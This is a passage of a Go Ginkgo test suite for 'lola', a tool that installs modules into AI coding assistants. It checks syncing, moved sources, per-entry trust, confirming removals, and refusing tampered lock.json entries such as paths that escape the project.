		_, err = sync(engine.SyncRequest{})
		Expect(errs.Hints(err)).To(Equal([]string{"re-pin it: lola sync -C " + proj + " --update example"}))

		user := engine.Scope{Kind: target.User}
		Expect(os.WriteFile(p.UserManifest, []byte("version: 1\nmodules: []\n"), 0o600)).To(Succeed())
		_, err = sync(engine.SyncRequest{Scope: user})
		Expect(err).To(MatchError("lola sync needs your confirmation to remove example, and there is no terminal to ask on"))
		Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --user -n", "then confirm them: lola sync --user -y"}))
	})

	It("a moved project replaces a cached source that no longer exists", func() {
		old := filepath.Join(tmp, "old")
		writeTree(filepath.Join(old, "mods", "kit"), map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		osc := engine.Scope{Kind: target.Project, ProjectDir: old}
		_, err := e.Install(ctx, osc, old, []engine.InstallRequest{{Arg: "./mods/kit"}}, claude)
		Expect(err).NotTo(HaveOccurred())
		user := engine.Scope{Kind: target.User}
		_, err = e.Install(ctx, user, tmp, []engine.InstallRequest{{Arg: filepath.Join(old, "mods", "kit")}}, claude)
		Expect(err).NotTo(HaveOccurred())
		Expect(os.RemoveAll(proj)).To(Succeed())
		Expect(os.Rename(old, proj)).To(Succeed()) // the project moves
		oldKit, newKit := filepath.Join(old, "mods", "kit"), filepath.Join(proj, "mods", "kit")
		origin := func() string {
			GinkgoHelper()
			o, found, err := e.Store.Origin("kit")
			Expect(err).NotTo(HaveOccurred())
			Expect(found).To(BeTrue())
			return o.Source
		}
		notice := engine.Notice{Level: engine.LevelWarn, Text: "kit: your cache has it from " + oldKit + ", which no longer exists; caching it from " + newKit}

		res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
		Expect(err).NotTo(HaveOccurred())
		Expect(res.Notices).To(ContainElement(notice))
		Expect(origin()).To(Equal(oldKit), "a dry run replaces nothing")

		// The old location reappears while the user answers: the commit, under the cache lock,
		// refuses it and replaces nothing.
		_, err = sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) {
			writeTree(oldKit, map[string]string{"lola.yml": "name: kit\n"})
			return engine.TrustAnswer{All: true}, nil
		}})
		Expect(err).To(MatchError(ContainSubstring(`a different module named "kit" is already in your cache`)))
		Expect(origin()).To(Equal(oldKit))
		Expect(os.RemoveAll(old)).To(Succeed())

		res, err = sync(engine.SyncRequest{Trust: yes})
		Expect(err).NotTo(HaveOccurred())
		Expect(asked).To(HaveLen(1), "the content still goes through trust: a moved project has no record")
		Expect(res.Notices).To(ContainElement(notice))
		Expect(origin()).To(Equal(newKit), "replaced after trust")
		Expect(read(".claude/commands/kit.md")).To(Equal("Kit\n"))

		// The replaced source is not rendered into the user scope, which installed the old folder.
		rendered, err := e.Render(ctx, user, engine.Options{})
		Expect(err).NotTo(HaveOccurred())
		Expect(rendered.Findings).To(ContainElement(And(HaveField("Code", engine.CodeSourceDiffers),
			HaveField("Text", "your cache now has it from "+newKit+", not the folder it was installed from"))))

		// A recorded source that still exists keeps the refusal.
		copyKit := filepath.Join(tmp, "copy", "mods", "kit")
		writeTree(copyKit, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		manPath := filepath.Join(proj, ".lola", "project.yml")
		Expect(os.WriteFile(manPath, []byte("version: 1\ntargets: [claude-code]\nmodules:\n  - name: kit\n    source: "+copyKit+"\n"), 0o600)).To(Succeed())
		_, err = sync(engine.SyncRequest{Trust: yes})
		Expect(err).To(MatchError(ContainSubstring("kit in your cache comes from " + newKit)))
	})

	It("a cached remote source is never replaced by a local folder", func() {
		install(sc, engine.InstallRequest{Arg: url})
		folder := filepath.Join(proj, "mods", "example")
		writeTree(folder, map[string]string{"lola.yml": "name: example\n", "commands/example.md": "Example\n"})
		Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
		Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
			"  - name: example\n    source: "+folder+"\n"), 0o600)).To(Succeed())
		before := state()
		_, err := sync(engine.SyncRequest{Trust: yes})
		Expect(err).To(MatchError(ContainSubstring("example in your cache comes from " + url)))
		Expect(errs.Hints(err)).To(ContainElement(ContainSubstring("lola cache rm example")))
		Expect(state()).To(Equal(before))
	})

	It("a cached local source that cannot be examined keeps the coached refusal without echoing the system error", func() {
		parent := filepath.Join(tmp, "par")
		odd := filepath.Join(parent, "kit\x01")
		// Install refuses such a path, so the cache is seeded as a hand-edited one would be.
		Expect(os.MkdirAll(p.Staging, 0o700)).To(Succeed())
		staged, err := os.MkdirTemp(p.Staging, "fetch-*")
		Expect(err).NotTo(HaveOccurred())
		writeTree(staged, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		_, err = e.Store.Put(store.PutRequest{Staged: staged, FallbackName: "kit", Source: odd, Type: "folder", Now: e.Now()})
		Expect(err).NotTo(HaveOccurred())
		Expect(os.WriteFile(parent, []byte("a file now"), 0o600)).To(Succeed()) // lstat of the old source: ENOTDIR
		folder := filepath.Join(proj, "mods", "kit")
		writeTree(folder, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		Expect(os.MkdirAll(filepath.Join(proj, ".lola"), 0o755)).To(Succeed())
		Expect(os.WriteFile(filepath.Join(proj, ".lola", "project.yml"), []byte("version: 1\ntargets: [claude-code]\nmodules:\n"+
			"  - name: kit\n    source: "+folder+"\n"), 0o600)).To(Succeed())
		_, err = sync(engine.SyncRequest{Trust: yes})
		Expect(err).To(MatchError(ContainSubstring("kit in your cache comes from")))
		Expect(err.Error()).NotTo(ContainSubstring("\x01"))
		Expect(err.Error()).NotTo(ContainSubstring("not a directory"))
		Expect(errs.Hints(err)).To(ContainElement(ContainSubstring("lola cache rm kit")))
	})

	It("install takes the place of a cached local source that no longer exists, and of no other", func() {
		old := filepath.Join(tmp, "old", "kit")
		writeTree(old, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		install(sc, engine.InstallRequest{Arg: old})
		moved := filepath.Join(tmp, "moved", "kit")
		Expect(os.MkdirAll(filepath.Dir(moved), 0o755)).To(Succeed())
		Expect(os.Rename(old, moved)).To(Succeed())
		install(sc, engine.InstallRequest{Arg: moved})
		o, _, err := e.Store.Origin("kit")
		Expect(err).NotTo(HaveOccurred())
		Expect(o.Source).To(Equal(moved))

		other := filepath.Join(tmp, "other", "kit")
		writeTree(other, map[string]string{"lola.yml": "name: kit\n", "commands/kit.md": "Kit\n"})
		_, err = e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: other}}, claude)
		Expect(err).To(MatchError(ContainSubstring(`a different module named "kit" is already in your cache`)), "the moved one still exists")
	})

	Describe("limited runs", func() {
		It("a sync limited to named modules touches nothing else", func() {
			gone := filepath.Join(tmp, "src", "gone")
			writeTree(gone, map[string]string{"lola.yml": "name: gone\n", "commands/gone.md": "Gone\n"})
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: src}, engine.InstallRequest{Arg: gone})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			bumped := pinFor("main")
			// A pull re-pins example to main and stops listing gone: both untrusted, neither named.
			pull(manifest.Change{Set: []manifest.Entry{bumped}, Remove: []string{"gone"}})
			requests.Store(0)
			before := state()

			_, err := sync(engine.SyncRequest{Modules: []string{"nope"}, Trust: yes, ConfirmRemovals: confirm})
			Expect(err).To(MatchError("nope is neither in project.yml nor installed here"))
			Expect(errs.Hints(err)).To(Equal([]string{"modules in project.yml: example, other", "installed but no longer listed: gone"}))
			Expect(state()).To(Equal(before), "an unknown name is refused before anything else")

			res, err := sync(engine.SyncRequest{Modules: []string{"other"}, ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred(), "the untrusted entries the user did not name need no answer")
			Expect(res.InSync).To(BeTrue())
			Expect(res.Notices).To(ContainElement(engine.Notice{Level: engine.LevelWarn, Text: "2 other modules are not in sync: example, gone → lola sync --project"}))
			Expect(asked).To(BeEmpty())
			Expect(removals).To(BeEmpty())
			Expect(requests.Load()).To(BeZero(), "example is not fetched")
			Expect(read(".claude/commands/gone.md")).To(Equal("Gone\n"), "an unnamed removed module stays installed")
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"))
			Expect(lockFile().Modules).To(HaveKey("gone"))
			Expect(state()).To(Equal(before))

			res, err = sync(engine.SyncRequest{Modules: []string{"gone"}, Trust: yes, ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveExactElements(HaveField("Changes", HaveExactElements(And(HaveField("Module", "gone"), HaveField("Kind", "removed"))))),
				"only the named module's change is asked about")
			Expect(removals).To(HaveExactElements(HaveExactElements(And(HaveField("Module", "gone"), HaveField("WholeModule", true)))))
			Expect(res.Removals).To(HaveLen(1))
			Expect(filepath.Join(proj, ".claude/commands/gone.md")).NotTo(BeAnExistingFile())
			Expect(lockFile().Modules).NotTo(HaveKey("gone"))
			Expect(requests.Load()).To(BeZero())
			r, err := e.Trust.Load(proj)
			Expect(err).NotTo(HaveOccurred())
			Expect(r.View.Find("gone")).To(BeNil(), "the trusted removal is recorded")
			Expect(r.View.Covers(bumped)).To(BeFalse(), "the unnamed entry stays untrusted")
			Expect(r.View.Find("example").Digest).To(Equal(lockFile().Modules["example"].Digest))

			asked = nil
			res, err = sync(engine.SyncRequest{Modules: []string{"example"}, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1))
			Expect(res.Notices).NotTo(ContainElement(HaveField("Text", ContainSubstring("not in sync"))), "every module is in sync now")
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship v2\n"))
			Expect(covered()).To(BeTrue())
		})

		It("re-pins only the named entries with --update", func() {
			install(sc, engine.InstallRequest{Arg: url, Ref: "main"}, engine.InstallRequest{Arg: src})
			before := loadManifest()
			commit := push(map[string]string{"commands/ship.md": "Ship v2\n"})
			_, err := sync(engine.SyncRequest{Modules: []string{"other"}, Update: true, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(loadManifest()).To(Equal(before), "a folder is never pinned, and example was not named")
			_, err = sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(loadManifest().Find("example").Commit).To(Equal(commit))
		})
	})

	Describe("removals", func() {
		BeforeEach(func() {
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: url, Ref: "v1"}, {Arg: src}},
				engine.Options{Targets: []string{"claude-code", "opencode"}})
			Expect(err).NotTo(HaveOccurred())
		})
		// drop removes other from project.yml and example's opencode target, and records the
		// result as trusted, as lola's own write would.
		drop := func() {
			GinkgoHelper()
			ex := *loadManifest().Find("example")
			ex.Targets = []string{"claude-code"}
			pull(manifest.Change{Set: []manifest.Entry{ex}, Remove: []string{"other"}})
			Expect(e.Trust.Save(proj, trust.ViewOf(loadManifest()))).To(Succeed())
		}

		It("removes a module project.yml no longer lists and a target an entry dropped, once confirmed", func() {
			drop()
			res, err := sync(engine.SyncRequest{ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(removals).To(HaveLen(1))
			Expect(res.Removals).To(Equal(removals[0]))
			Expect(res.Removals).To(HaveExactElements(
				And(HaveField("Module", "example"), HaveField("Targets", []string{"opencode"}), HaveField("WholeModule", false),
					HaveField("Paths", And(ContainElement(engine.RemovedPath{Target: "opencode", Path: ".opencode/commands/ship.md"}),
						Not(ContainElement(HaveField("Path", ".claude/commands/ship.md")))))),
				And(HaveField("Module", "other"), HaveField("Targets", []string{"claude-code", "opencode"}), HaveField("WholeModule", true),
					HaveField("Paths", ContainElements(engine.RemovedPath{Target: "claude-code", Path: ".claude/commands/other.md"},
						engine.RemovedPath{Target: "opencode", Path: ".opencode/commands/other.md"}))),
			))
			Expect(filepath.Join(proj, ".claude/commands/other.md")).NotTo(BeAnExistingFile())
			Expect(filepath.Join(proj, ".opencode/commands/ship.md")).NotTo(BeAnExistingFile())
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"))
			Expect(lockFile().Modules).NotTo(HaveKey("other"))
			Expect(filepath.Join(proj, ".lola", "modules", "other")).NotTo(BeAnExistingFile())
			res, err = sync(engine.SyncRequest{})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.InSync).To(BeTrue())
		})

		It("refuses removals it cannot ask about, and a dry run lists them without asking", func() {
			drop()
			before := state()
			_, err := sync(engine.SyncRequest{})
			Expect(err).To(MatchError("lola sync needs your confirmation to remove example, other, and there is no terminal to ask on"))
			Expect(errs.Hints(err)).To(Equal([]string{"see them: lola sync --project -n", "then confirm them: lola sync --project -y"}))
			Expect(state()).To(Equal(before))
			res, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Removals).To(HaveLen(2))
			Expect(state()).To(Equal(before))
		})

		It("--force answers the removals off a terminal, and never the trust question", func() {
			drop()
			res, err := sync(engine.SyncRequest{Options: engine.Options{Force: true, DryRun: true}})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.EquivalentCommands).To(Equal([]string{"lola sync --project --force"}), "--force needs no -y")
			_, err = sync(engine.SyncRequest{Options: engine.Options{Force: true}})
			Expect(err).NotTo(HaveOccurred(), "the removals are confirmed by --force, unasked")
			Expect(removals).To(BeEmpty(), "nothing was asked")
			Expect(filepath.Join(proj, ".claude/commands/other.md")).NotTo(BeAnExistingFile())
		})

		It("a conflict refusal says what the sync with --force would remove without asking", func() {
			drop()
			writeTree(proj, map[string]string{".claude/commands/other.md": "mine"})
			_, err := sync(engine.SyncRequest{ConfirmRemovals: confirm, Options: engine.Options{ForceRun: "lola sync --project --force"}})
			Expect(err).To(MatchError(And(ContainSubstring(".claude/commands/other.md: hand-edited"),
				HaveSuffix("\n  with --force it also removes, without asking: example (opencode), other (whole module)"))))
			Expect(errs.Hints(err)).To(Equal([]string{"lola sync --project --force"}))
		})

		// plant adds an artifact to the ledger entry of other, which drop() makes a removal.
		plant := func(a ledger.Artifact) {
			GinkgoHelper()
			lp := filepath.Join(proj, ".lola", "lock.json")
			l, err := ledger.Load(lp)
			Expect(err).NotTo(HaveOccurred())
			o := l.Modules["other"]
			o.Artifacts = append(o.Artifacts, a)
			if !slices.Contains(o.Targets, a.Target) {
				o.Targets = append(o.Targets, a.Target) // lock.json lists the target of every artifact
			}
			Expect(l.Save(lp)).To(Succeed())
		}
		lockPath := func() string { return filepath.Join(proj, ".lola", "lock.json") }
		DescribeTable("refuses a planted ledger entry before asking anything, naming lock.json, the module and lola repair",
			func(a ledger.Artifact, want string) {
				drop()
				plant(a)
				before := state()
				_, err := sync(engine.SyncRequest{ConfirmRemovals: confirm})
				Expect(err).To(MatchError(lockPath() + ": module other: " + want))
				Expect(errs.Hints(err)).To(Equal([]string{"lola repair --project"}))
				Expect(removals).To(BeEmpty(), "nothing was asked")
				Expect(state()).To(Equal(before))
			},
			Entry("a path outside the project", ledger.Artifact{Target: "claude-code", Kind: "file", Path: "../outside.md"},
				`artifact "../outside.md" on target "claude-code" leaves the target's root`),
			Entry("an absolute path", ledger.Artifact{Target: "claude-code", Kind: "file", Path: "/tmp/outside.md"},
				`artifact "/tmp/outside.md" on target "claude-code" leaves the target's root`),
			Entry("an unknown target", ledger.Artifact{Target: "bogus", Kind: "file", Path: "x.md"},
				`target "bogus" is not a target lola knows`),
		)

		DescribeTable("every command that reads lock.json refuses a planted entry the same way",
			func(run func() error) {
				plant(ledger.Artifact{Target: "bogus", Kind: "file", Path: "x.md"})
				before := state()
				err := run()
				Expect(err).To(MatchError(lockPath() + `: module other: target "bogus" is not a target lola knows`))
				Expect(errs.Hints(err)).To(Equal([]string{"lola repair --project"}))
				Expect(state()).To(Equal(before), "nothing was written or moved")
			},
			Entry("lola list", func() error { _, _, err := e.Status(ctx, sc, nil); return err }),
			Entry("lola render", func() error { _, err := e.Render(ctx, sc, engine.Options{}); return err }),
			Entry("lola uninstall", func() error { _, err := e.Uninstall(ctx, sc, []string{"other"}, engine.Options{}); return err }),
			Entry("lola tidy", func() error { _, err := e.Tidy(ctx, engine.TidyRequest{Scope: sc, All: true, Yes: true}); return err }),
		)

		It("the refusal's lola repair keeps the run's output flags", func() {
			plant(ledger.Artifact{Target: "claude-code", Kind: "file", Path: "../outside.md"})
			e.Display = []string{"--json", "--no-pager"}
			_, _, err := e.Status(ctx, sc, nil)
			Expect(errs.Hints(err)).To(Equal([]string{"lola repair --project --json --no-pager"}))
		})

		It("a declined removal writes nothing and records no consent", func() {
			kit := filepath.Join(proj, "mods", "kit")
			writeTree(kit, map[string]string{"lola.yml": "name: kit\nhooks: {pre-install: hooks/pre.sh}\n", "hooks/pre.sh": "#!/bin/sh\nexit 0\n",
				"commands/fix.md": "Fix.\n", "skills/review/SKILL.md": "---\ndescription: Review\nhooks: {Stop: [{hooks: [{type: command, command: ./stop.sh}]}]}\n---\nR.\n"})
			Expect(os.Chmod(filepath.Join(kit, "hooks", "pre.sh"), 0o755)).To(Succeed())
			drop()
			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
			project := func() map[string]string {
				GinkgoHelper()
				out := map[string]string{}
				for k, v := range state() {
					if !strings.HasPrefix(k, filepath.Dir(p.Store)) && k != p.Trust {
						out[k] = v
					}
				}
				return out
			}
			before := project()
			var consents []string
			opts := engine.Options{
				Ask: func(string, []engine.HookScript) (bool, error) {
					consents = append(consents, "install")
					return true, nil
				},
				AskRuntimeHooks: func(string, []engine.RuntimeHook) (bool, error) {
					consents = append(consents, "runtime")
					return true, nil
				},
			}
			_, err := sync(engine.SyncRequest{Options: opts, Trust: yes, ConfirmRemovals: func(rs []engine.Removal) (bool, error) {
				removals = append(removals, rs)
				return false, nil
			}})
			Expect(err).To(MatchError(engine.ErrDeclined))
			Expect(asked).To(HaveLen(1), "trust was asked first")
			Expect(removals).To(HaveLen(1))
			Expect(consents).To(BeEmpty(), "no hook consent was asked before the removals")
			Expect(p.Consent).NotTo(BeAnExistingFile(), "none was recorded")
			Expect(project()).To(Equal(before), "nothing in the project changed")
			Expect(covered()).To(BeTrue(), "the trust answer is recorded, so the next sync asks only the removals")
		})
	})

	Describe("per-entry trust", func() {
		// only answers the trust question by accepting the named entries, recording each report.
		only := func(names ...string) func(engine.TrustReport) (engine.TrustAnswer, error) {
			return func(rep engine.TrustReport) (engine.TrustAnswer, error) {
				asked = append(asked, rep)
				return engine.TrustAnswer{Modules: names}, nil
			}
		}
		folder := func(name string, files map[string]string) string {
			dir := filepath.Join(proj, "mods", name)
			writeTree(dir, files)
			writeTree(dir, map[string]string{"lola.yml": "name: " + name + "\n", "commands/" + name + ".md": name + "\n"})
			return dir
		}
		// tool serves a second repository, holding module tool, next to example.
		tool := func() string {
			GinkgoHelper()
			w, b := filepath.Join(tmp, "toolwork"), filepath.Join(tmp, "srv", "tool.git")
			writeTree(w, map[string]string{"lola.yml": "name: tool\n", "commands/tool.md": "Tool\n"})
			gitIn(w, "init", "-q", "-b", "main")
			gitIn(w, "add", "-A")
			gitIn(w, "commit", "-q", "-m", "init")
			gitIn(tmp, "clone", "-q", "--bare", w, b)
			return strings.TrimSuffix(url, "/example.git") + "/tool.git"
		}
		changed := func(rep engine.TrustReport) []string {
			var out []string
			for _, c := range rep.Changes {
				out = append(out, c.Module)
			}
			return out
		}

		It("a declined entry stays as installed and is asked again", func() {
			gone := folder("gone", nil)
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: gone})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			folder("kit", nil)
			folder("acc", nil)
			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "main"}, {Name: "kit", Source: "mods/kit"},
				{Name: "acc", Source: "mods/acc"}}, Remove: []string{"gone"}})

			res, err := sync(engine.SyncRequest{Trust: only("acc"), ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(changed(asked[0])).To(ConsistOf("acc", "example", "gone", "kit"))
			Expect(removals).To(BeEmpty(), "the declined removal is not asked about")
			Expect(read(".claude/commands/acc.md")).To(Equal("acc\n"), "the accepted entry is installed")
			Expect(read(".claude/commands/ship.md")).To(Equal("Ship $ARGUMENTS\n"), "a declined change stays at the version installed")
			Expect(filepath.Join(proj, ".claude/commands/kit.md")).NotTo(BeAnExistingFile(), "a declined addition stays uninstalled")
			Expect(read(".claude/commands/gone.md")).To(Equal("gone\n"), "a declined removal stays installed")
			Expect(lockFile().Modules).To(HaveKey("gone"))
			Expect(res.Notices).To(ContainElement(engine.Notice{Level: engine.LevelWarn,
				Text: "left as installed until you trust them: example, gone, kit → lola sync --project"}))
			Expect(res.Trust.Changes).To(HaveExactElements(HaveField("Module", "acc")), "the result reports what was applied")
			Expect(res.Modules).To(HaveExactElements(HaveField("Name", "acc")))

			asked = nil
			_, err = sync(engine.SyncRequest{Trust: only("acc"), ConfirmRemovals: confirm})
			Expect(err).To(MatchError(engine.ErrDeclined), "acc is no longer a change, so this answer accepts nothing")
			Expect(changed(asked[0])).To(ConsistOf("example", "gone", "kit"), "each declined entry is asked about again")
		})

		It("partial trust records and caches only what was accepted", func() {
			gone := folder("gone", nil)
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: gone})
			before, err := e.Trust.Load(proj)
			Expect(err).NotTo(HaveOccurred())
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			toolURL := tool()
			folder("kit", nil)
			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "main"}, {Name: "tool", Source: toolURL, Ref: "main"},
				{Name: "kit", Source: "mods/kit"}}, Remove: []string{"gone"}})
			pulled := loadManifest()

			res, err := sync(engine.SyncRequest{Trust: only("tool", "kit"), ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(res.Pins).To(HaveExactElements(HaveField("Module", "tool")), "pins are written for accepted entries only")
			Expect(loadManifest().Find("example")).To(Equal(pulled.Find("example")), "the declined entry gets no pin")
			Expect(loadManifest().Find("tool").Digest).NotTo(BeEmpty())
			r, err := e.Trust.Load(proj)
			Expect(err).NotTo(HaveOccurred())
			Expect(r.View.Find("example")).To(Equal(before.View.Find("example")), "a declined entry keeps its old record")
			Expect(r.View.Find("gone")).To(Equal(before.View.Find("gone")), "a declined removal stays in the record")
			Expect(r.View.Covers(*loadManifest().Find("tool"))).To(BeTrue(), "the accepted entry is recorded with its pin")
			Expect(r.View.Covers(*loadManifest().Find("kit"))).To(BeTrue())
			o, found, err := e.Store.Origin("example")
			Expect(err).NotTo(HaveOccurred())
			Expect(found).To(BeTrue())
			Expect(o.Heads).To(HaveExactElements(HaveField("Ref", "v1")), "the declined fetch of main is never cached")
			versions, err := os.ReadDir(filepath.Join(p.Store, "example", "versions"))
			Expect(err).NotTo(HaveOccurred())
			Expect(versions).To(HaveLen(1))
			Expect(e.Store.Has("tool")).To(BeTrue(), "the accepted content is cached")
		})

		It("a run limited to names trusts the top-level targets only through a named entry that installs to them", func() {
			own, docs, kit := folder("own", nil), folder("docs", nil), folder("kit", nil)
			install(sc, engine.InstallRequest{Arg: docs}, engine.InstallRequest{Arg: kit})
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: own}}, engine.Options{Targets: []string{"opencode"}})
			Expect(err).NotTo(HaveOccurred())
			off := false
			ownEntry, docsEntry := *loadManifest().Find("own"), *loadManifest().Find("docs")
			ownEntry.Rules, docsEntry.Rules = &off, &off
			pull(manifest.Change{Targets: []string{"claude-code", "opencode"}, Set: []manifest.Entry{ownEntry, docsEntry}})
			topLevel := func() []string {
				GinkgoHelper()
				r, err := e.Trust.Load(proj)
				Expect(err).NotTo(HaveOccurred())
				return r.View.Targets
			}

			// own has targets of its own: trusting all of a run limited to it leaves them untrusted.
			_, err = sync(engine.SyncRequest{Modules: []string{"own"}, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1))
			Expect(asked[0].Targets).To(BeNil(), "the run installs nothing to them, so it does not ask about them")
			Expect(changed(asked[0])).To(Equal([]string{"own"}))
			Expect(topLevel()).To(Equal([]string{"claude-code"}))
			Expect(filepath.Join(proj, ".opencode/commands/docs.md")).NotTo(BeAnExistingFile())
			Expect(filepath.Join(proj, ".opencode/commands/kit.md")).NotTo(BeAnExistingFile())

			// docs has none: trusting it trusts them, for it and, without a question, for kit.
			asked = nil
			_, err = sync(engine.SyncRequest{Modules: []string{"docs"}, Trust: yes})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked).To(HaveLen(1))
			Expect(asked[0].Targets).NotTo(BeNil())
			Expect(topLevel()).To(Equal([]string{"claude-code", "opencode"}))
			Expect(read(".opencode/commands/docs.md")).To(Equal("docs\n"))
			Expect(filepath.Join(proj, ".opencode/commands/kit.md")).NotTo(BeAnExistingFile(), "kit was not in the run")

			asked = nil
			_, err = sync(engine.SyncRequest{Modules: []string{"kit"}})
			Expect(err).NotTo(HaveOccurred(), "off a terminal: nothing left to trust")
			Expect(asked).To(BeEmpty())
			Expect(read(".opencode/commands/kit.md")).To(Equal("kit\n"))
		})

		It("top-level targets are trusted only with an entry that installs to them", func() {
			kit := folder("kit", nil)
			gone := folder("gone", nil)
			own := folder("own", nil)
			install(sc, engine.InstallRequest{Arg: kit}, engine.InstallRequest{Arg: gone})
			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: own}}, engine.Options{Targets: []string{"opencode"}})
			Expect(err).NotTo(HaveOccurred())
			Expect(loadManifest().Find("own").Targets).To(Equal([]string{"opencode"}))
			pull(manifest.Change{Targets: []string{"claude-code", "opencode"}, Remove: []string{"gone"}})
			Expect(os.Remove(filepath.Join(proj, ".opencode/commands/own.md"))).To(Succeed())

			// A ticked removed entry does not accept them: kit, which installs to them, leaves the run.
			res, err := sync(engine.SyncRequest{Trust: only("gone"), ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(asked[0].Targets).NotTo(BeNil())
			Expect(filepath.Join(proj, ".claude/commands/gone.md")).NotTo(BeAnExistingFile(), "the accepted removal is applied")
			Expect(filepath.Join(proj, ".opencode/commands/kit.md")).NotTo(BeAnExistingFile(), "kit does not take the untrusted targets")
			Expect(read(".opencode/commands/own.md")).To(Equal("own\n"), "an entry with targets of its own stays in the run")
			Expect(res.Notices).To(ContainElement(HaveField("Text", "left as installed until you trust them: kit → lola sync --project")))
			r, err := e.Trust.Load(proj)
			Expect(err).NotTo(HaveOccurred())
			Expect(r.View.Targets).To(Equal([]string{"claude-code"}))

			// An accepted entry that installs to them accepts them, and kit joins the run.
			folder("fresh", nil)
			pull(manifest.Change{Set: []manifest.Entry{{Name: "fresh", Source: "mods/fresh"}}})
			asked = nil
			_, err = sync(engine.SyncRequest{Trust: only("fresh"), ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(read(".opencode/commands/kit.md")).To(Equal("kit\n"))
			Expect(read(".opencode/commands/fresh.md")).To(Equal("fresh\n"))
			Expect(covered()).To(BeTrue())

			// Covered top-level targets drop no entry from a partial answer.
			off := false
			ownEntry := *loadManifest().Find("own")
			ownEntry.Rules = &off
			folder("late", nil)
			pull(manifest.Change{Set: []manifest.Entry{ownEntry, {Name: "late", Source: "mods/late"}}})
			Expect(os.Remove(filepath.Join(proj, ".claude/commands/kit.md"))).To(Succeed())
			_, err = sync(engine.SyncRequest{Trust: only("late"), ConfirmRemovals: confirm})
			Expect(err).NotTo(HaveOccurred())
			Expect(read(".claude/commands/kit.md")).To(Equal("kit\n"), "kit stayed in the run")
		})

		It("a No to removals applies nothing and keeps the trust answer", func() {
			gone := folder("gone", nil)
			install(sc, engine.InstallRequest{Arg: url, Ref: "v1"}, engine.InstallRequest{Arg: folder("other", nil)}, engine.InstallRequest{Arg: gone})
			push(map[string]string{"commands/ship.md": "Ship v2\n"})
			off := false
			other := *loadManifest().Find("other")
			other.Rules = &off
			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "v1"}, other}, Remove: []string{"gone"}})
			project := func() map[string]string {
				out := state()
				maps.DeleteFunc(out, func(k, _ string) bool { return strings.HasPrefix(k, filepath.Dir(p.Store)) || k == p.Trust })
				return out
			}
			before := project()
			no := func(rs []engine.Removal) (bool, error) { removals = append(removals, rs); return false, nil }

			_, err := sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			declined, ok := errors.AsType[*engine.RemovalsDeclinedError](err)
			Expect(ok).To(BeTrue())
			Expect(*declined).To(Equal(engine.RemovalsDeclinedError{Recorded: true, Render: true, Again: []string{"example"}, Retry: "lola sync --project"}),
				"render would install other without rules; example's pin is asked again")
			Expect(project()).To(Equal(before), "nothing applied")
			r, err := e.Trust.Load(proj)
			Expect(err).NotTo(HaveOccurred())
			Expect(r.View.Covers(*loadManifest().Find("example"))).To(BeTrue(), "the accepted unpinned entry, without the pin lola did not write")
			Expect(r.View.Covers(other)).To(BeTrue())
			Expect(r.View.Find("gone")).To(BeNil())

			asked, removals = nil, nil
			_, err = sync(engine.SyncRequest{Trust: yes, ConfirmRemovals: no})
			Expect(err).To(MatchError(engine.ErrDeclined))
			Expect(asked).To(HaveExactElements(HaveField("Changes", HaveExactElements(And(HaveField("Module", "example"),
				HaveField("Reason", "pin what v1 serves now"))))), "only the pin is asked again")
			Expect(removals).To(HaveLen(1), "and the removals")
		})

		It("a No to removals does not claim render installs a folder whose content changed", func() {
			notes := folder("notes", nil)
			gone := folder("gone", nil)
